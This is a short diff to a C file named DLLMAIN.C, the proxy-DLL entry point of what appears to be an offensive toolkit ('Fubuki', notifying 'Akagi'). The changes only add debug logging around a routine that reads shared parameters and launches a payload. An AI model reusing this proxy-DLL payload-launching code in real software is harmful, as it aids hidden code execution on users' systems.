@@ -4,9 +4,9 @@
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     3.17
+*  VERSION:     3.19
 *
-*  DATE:        20 Mar 2019
+*  DATE:        09 Apr 2019
 *
 *  Proxy dll entry point, Fubuki Kai Ni.
 *
@@ -52,7 +52,7 @@ VOID DefaultPayload(
     PWSTR lpParameter;
     ULONG cbParameter;
 
-    OutputDebugString(LoadedMsg);
+    ucmDbgMsg(LoadedMsg);
 
     //
     // Read shared params block.
@@ -60,15 +60,22 @@ VOID DefaultPayload(
     RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
     bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
     if (bSharedParamsReadOk) {
+        ucmDbgMsg(L"Fubuki, ucmReadSharedParameters OK\r\n");
+
         lpParameter = g_SharedParams.szParameter;
         cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
     }
     else {
+        ucmDbgMsg(L"Fubuki, ucmReadSharedParameters Failed\r\n");
         lpParameter = NULL;
         cbParameter = 0UL;
     }
 
+    ucmDbgMsg(L"Fubuki, before ucmLaunchPayload\r\n");
+
     ExitCode = (ucmLaunchPayload(lpParameter, cbParameter) != FALSE);
+
+    ucmDbgMsg(L"Fubuki, after ucmLaunchPayload\r\n");
 
     //
     // If this is default executable, show runtime info.
@@ -82,6 +89,7 @@ VOID DefaultPayload(
     // Notify Akagi.
     //
     if (bSharedParamsReadOk) {
+        ucmDbgMsg(L"Fubuki, completion\r\n");
         ucmSetCompletion(g_SharedParams.szSignalObject);
     }
 
